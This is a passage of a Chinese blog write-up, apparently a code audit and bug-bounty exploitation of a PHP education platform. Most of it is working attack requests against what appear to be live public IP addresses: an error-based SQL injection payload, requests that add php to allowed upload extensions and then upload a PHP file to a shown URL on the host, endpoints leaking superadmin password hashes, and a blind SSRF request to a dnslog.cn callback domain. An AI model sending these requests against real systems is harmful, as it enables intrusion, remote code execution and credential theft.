<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9P7Sv8"><img src="https://s1.ax1x.com/2023/04/18/p9P7Sv8.png" alt="p9P7Sv8.png"></a></p>
<p>这里我们发现当传入的type是1和其他时，后缀是被写死的，当为2或者3时取的是$ext_type变量</p>
<p>而这个变量是file_exe而来的</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9P79KS"><img src="https://s1.ax1x.com/2023/04/18/p9P79KS.png" alt="p9P79KS.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9P7FEj"><img src="https://s1.ax1x.com/2023/04/18/p9P7FEj.png" alt="p9P7FEj.png"></a></p>
<p>而是upload_document从sys_config表中的tag=com.upload_document字段的来的</p>
<p>我们猜测既然不是写死的，写在数据库中，故应该是可以更改的</p>
<p>所以我们全局搜索</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9P7kUs"><img src="https://s1.ax1x.com/2023/04/18/p9P7kUs.png" alt="p9P7kUs.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9P7VCq"><img src="https://s1.ax1x.com/2023/04/18/p9P7VCq.png" alt="p9P7VCq.png"></a></p>
<p>构造请求包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://111.77.154.178:1980/sadmin/setting/document.html</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>142</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://111.77.154.178:1980</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Cookie: xxx</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&amp;quot;Windows&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&amp;quot;Google Chrome&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Chromium&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Not=A?Brand&amp;quot;;v=&amp;quot;24&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">file_exe</span>=ppt%<span class="number">2</span>Cpptx%<span class="number">2</span>Cdoc%<span class="number">2</span>Cdocx%<span class="number">2</span>Cxls%<span class="number">2</span>Cxlsx%<span class="number">2</span>Ctxt%<span class="number">2</span>Cpdf%<span class="number">2</span>Crar%<span class="number">2</span>Cphp&amp;file_num=<span class="number">10</span>&amp;file_format_size=<span class="number">0</span>.<span class="number">5</span>&amp;file_max_size=<span class="number">5</span>&amp;tag=com.upload_document</span></span><br></pre></td></tr></table></figure>

<p>这里的file_exe是上传文件上传可支持的后缀，tag就是上张截图的列名</p>
<p>另外我们发现这里的tag是没有防护直接执行SQL，故存在SQL注入</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sadmin/setting/post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://218.27.202.223:8088/sadmin/index/index.html</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>176</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://218.27.202.223:8088</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">file_exe</span>=wmv%<span class="number">2</span>Cavi%<span class="number">2</span>Casf%<span class="number">2</span>Crmvb%<span class="number">2</span>Cmov%<span class="number">2</span>Cmp4%<span class="number">2</span>Cmkv%<span class="number">2</span>Cflv%<span class="number">2</span>Cvob%<span class="number">2</span>Cphp&amp;file_num=<span class="number">20</span>&amp;file_format_size=<span class="number">1</span>&amp;file_max_size=<span class="number">8</span>&amp;tag=<span class="number">1</span>&amp;#<span class="number">039</span>;and/**/extractvalue(<span class="number">1</span>,concat(char(<span class="number">126</span>),database()))and&amp;#<span class="number">039</span>;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9P7mvT"><img src="https://s1.ax1x.com/2023/04/18/p9P7mvT.png" alt="p9P7mvT.png"></a></p>
<p>这里就可以修改file_exe为可接受php。构造上传包，文件上传 * 2</p>
<p>1</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ucenter/resource/attr_post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://111.77.154.178:1980/ucenter/resource/info/id/7</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------40202969322504284255499220527</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>461</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://111.77.154.178:1980</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&amp;quot;Windows&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&amp;quot;Google Chrome&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Chromium&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Not=A?Brand&amp;quot;;v=&amp;quot;24&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span></span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=&amp;quot;<span class="keyword">type</span>&amp;quot;</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">2</span></span></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span></span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=&amp;quot;vid&amp;quot;</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">7</span></span></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span></span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=&amp;quot;<span class="keyword">file</span>&amp;quot;; filename=&amp;quot;<span class="number">1234.</span>php&amp;quot;</span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span>--</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/04/18/6f7503de5b78758ef408e0214f0250ed.png" alt="6f7503de5b78758ef408e0214f0250ed.png"></p>
<p>2</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ucenter/resource/attr_post</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://111.77.154.178:1980/ucenter/resource/info/id/7</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------40202969322504284255499220527</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>461</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://111.77.154.178:1980</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&amp;quot;Windows&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&amp;quot;Google Chrome&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Chromium&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Not=A?Brand&amp;quot;;v=&amp;quot;24&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span></span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=&amp;quot;<span class="keyword">type</span>&amp;quot;</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">3</span></span></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span></span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=&amp;quot;vid&amp;quot;</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"><span class="number">7</span></span></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span></span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=&amp;quot;<span class="keyword">file</span>&amp;quot;; filename=&amp;quot;<span class="number">1234.</span>php&amp;quot;</span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">-----------------------------<span class="number">40202969322504284255499220527</span>--</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/04/18/073c205f027a57e1f7da39b570f21b1e.png" alt="073c205f027a57e1f7da39b570f21b1e.png"></p>
<p>3）发现没，这里的后缀也是我们上个的修改</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/c28a109b4cbc7aa461309bc2372df708.png" alt="c28a109b4cbc7aa461309bc2372df708.png"></p>
<p>不多说，构造请求包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ucenter/layim/uploadfile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://111.77.154.178:1980/</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------46237532810277305873231917909</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>241</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://111.77.154.178:1980</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&amp;quot;Windows&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&amp;quot;Google Chrome&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Chromium&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Not=A?Brand&amp;quot;;v=&amp;quot;24&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"></span><br><span class="line"><span class="language-sas">-----------------------------46237532810277305873231917909</span></span><br><span class="line"><span class="language-sas">Content-Disposition: form-data; name=<span class="variable">&amp;quot</span>;<span class="keyword">file</span><span class="variable">&amp;quot</span>;; <span class="keyword">filename</span>=<span class="variable">&amp;quot</span>;1234.php<span class="variable">&amp;quot</span>;</span></span><br><span class="line"><span class="language-sas">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">-----------------------------46237532810277305873231917909--</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/04/18/665f13ba3c506f222c2b0ae37c90c526.png" alt="665f13ba3c506f222c2b0ae37c90c526.png"></p>
<p><a target="_blank" rel="noopener" href="http://111.77.154.178:1980/static//webim//document//202302//5cafed9fd8dde4bc7b7d4ed74d477c38.php">http://111.77.154.178:1980/static//webim//document//202302//5cafed9fd8dde4bc7b7d4ed74d477c38.php</a></p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/49dd6c9c49f85511938b63c92ec16015.png" alt="49dd6c9c49f85511938b63c92ec16015.png"></p>
<p>4）/Home/Wk/task_post</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/a4b5870dd21973d9e3f1fd5279c250b9.png" alt="a4b5870dd21973d9e3f1fd5279c250b9.png"></p>
<p>同</p>
<h4 id="越权篇"><a href="#越权篇" class="headerlink" title="越权篇"></a>越权篇</h4><p>越权分为查看型越权和篡改型越权，这里按照edusrc对查看型越权信息的收录是根据密码hash，身份证。故其他类型越权不管</p>
<p><a target="_blank" rel="noopener" href="http://111.77.154.178:1980/">http://111.77.154.178:1980</a></p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/7c2c88af9b197f68d2ea4bb3731d8930.png" alt="7c2c88af9b197f68d2ea4bb3731d8930.png"></p>
<p>我看了一下，注册信息和后台并没有记录身份证等信息，故只有密码hash为敏感信息</p>
<p>权限划分是：</p>
<p>superadmin &gt; admin &gt; 教师 &gt; 学生</p>
<h4 id="越权篇-1"><a href="#越权篇-1" class="headerlink" title="越权篇"></a>越权篇</h4><p><img src="https://s1.imagehub.cc/images/2023/04/18/69254d8b9f6e964fa85e310915c20d46.png" alt="69254d8b9f6e964fa85e310915c20d46.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/7d24007491e473ad98f09a446cb47d40.png" alt="7d24007491e473ad98f09a446cb47d40.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/be9a9b834bcb866fe0e7dd6b429c2846.png" alt="be9a9b834bcb866fe0e7dd6b429c2846.png"></p>
<p>越权查看到超级管理员superadmin的密码，相当于垂直越了</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/3254c7cd119fbc7ff37b829e24ce0cc8.png" alt="3254c7cd119fbc7ff37b829e24ce0cc8.png"></p>
<p>发现我们的密码hash是存储在这张表里，故全局搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M(&amp;#039;user&amp;#039;)-&amp;gt;where($where)-&amp;gt;limit</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/04/18/eb9b085cb68fe08117dc8f3e93366e4b.png" alt="eb9b085cb68fe08117dc8f3e93366e4b.png"></p>
<p>比如这处</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/708d33c067838fd4642825cfa9f2c9d5.png" alt="708d33c067838fd4642825cfa9f2c9d5.png"></p>
<p>/admin/role/get_role_user</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/role/get_role_user?sid=&amp;rid=&amp;username=&amp;pagelimit=10&amp;pagecurr=1&amp;oid=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>111.77.154.178:1980</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://111.77.154.178:1980/admin/user/index.html</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&amp;quot;Windows&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&amp;quot;Google Chrome&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Chromium&amp;quot;;v=&amp;quot;101&amp;quot;, &amp;quot;Not=A?Brand&amp;quot;;v=&amp;quot;24&amp;quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.imagehub.cc/images/2023/04/18/684e8d98e76a17a5f1ddfd94fa2cd6f8.png" alt="684e8d98e76a17a5f1ddfd94fa2cd6f8.png"></p>
<p>同理，得到十几处查看型越权</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/admin/role/get_user</span><br><span class="line"></span><br><span class="line">/admin/role/get_role_user</span><br><span class="line"></span><br><span class="line">/admin/student/get_user</span><br><span class="line"></span><br><span class="line">/admin/user/get_user</span><br><span class="line"></span><br><span class="line">/admin/user/get_audit_user</span><br><span class="line"></span><br><span class="line">/ucenter/user/get_role_user</span><br><span class="line"></span><br><span class="line">/ucenter/layim/get_find_data</span><br><span class="line"></span><br><span class="line">/appadmin/campaigncourse/insert_data</span><br><span class="line"></span><br><span class="line">/appadmin/Famteacher/insert_data</span><br><span class="line"></span><br><span class="line">/appadmin/spjy/insert_data</span><br><span class="line"></span><br><span class="line">/appadmin/spjy/update_data/id/1</span><br><span class="line"></span><br><span class="line">/home/mk/get_role_user</span><br><span class="line"></span><br><span class="line">/home/zdkt/get_role_user</span><br></pre></td></tr></table></figure>







<h4 id="SSRF篇"><a href="#SSRF篇" class="headerlink" title="SSRF篇"></a>SSRF篇</h4><p>全局搜索造成SSRF漏洞的函数</p>
<p>curl_exec()</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/23ee4136c369680db1ac2c3902dc5144.png" alt="23ee4136c369680db1ac2c3902dc5144.png"></p>
<p>这里的url就是漏洞变量</p>
<p>下面的</p>
<p>file_get_contents(‘php://input’);就是php获取json格式的参数</p>
<p>然后balabala…</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/c85a00741bf8e958185f811c60ef95a9.png" alt="c85a00741bf8e958185f811c60ef95a9.png"></p>
<p>然后点击post发包</p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/edcecaef952355c764020c6564d60f8b.png" alt="edcecaef952355c764020c6564d60f8b.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/04/18/f4a6909c54ff27b5098303b032c391e4.png" alt="f4a6909c54ff27b5098303b032c391e4.png"></p>
<p>由于并没有将内容返回输出，故是一个无回显的SSRF</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/auapi/auapi.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>39</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span><span class="string">&quot;g2d8yb.dnslog.cn&quot;</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>





<h4 id="SQL注入篇（少挖几个代表性的，SQL数量比较多）"><a href="#SQL注入篇（少挖几个代表性的，SQL数量比较多）" class="headerlink" title="SQL注入篇（少挖几个代表性的，SQL数量比较多）"></a>SQL注入篇（少挖几个代表性的，SQL数量比较多）</h4><p>我个人认为SQL注入其实好挖，就一条SQL语句，前后看看是否有过滤即可，不像存储XSS既要考虑输入和输出的过滤，你在a位置插入数据后，还要搜索对应的表找到输出的地方</p>
<h5 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h5><p>1）SQL * 1</p>
